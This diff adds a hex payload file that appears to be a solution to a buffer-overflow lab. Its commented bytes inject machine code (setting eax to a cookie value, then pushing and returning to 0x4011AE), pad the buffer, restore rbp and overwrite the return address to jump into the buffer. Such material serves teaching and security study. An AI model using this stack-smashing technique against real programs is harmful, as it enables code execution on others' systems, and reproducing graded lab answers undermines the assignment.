@@ -1,0 +1,14 @@
+/* smoke:@4010B6>> */ 
+/* start of buf[]:0x55683a60 */
+/* rbp 0x55683aa0  */
+/* ret Test 0x4011AE */
+b8 81 a1 d9 66 /* mov    $0x66d9a181,%eax 5Bytes */
+68 AE 11 40 00 /* pushq  $0x4011AE 5Bytes */
+c3 /* retq */ 
+11 11 11 11 11 
+11 11 11 11 11 
+11 11 11 11 11 
+11 11 11 11 11
+11 /* Rest 21 Bytes in buf */
+A0 3A 68 55 00 00 00 00 /* + rbp 8 Bytes */
+60 3A 68 55 00 00 00 00 /* Ourcode */
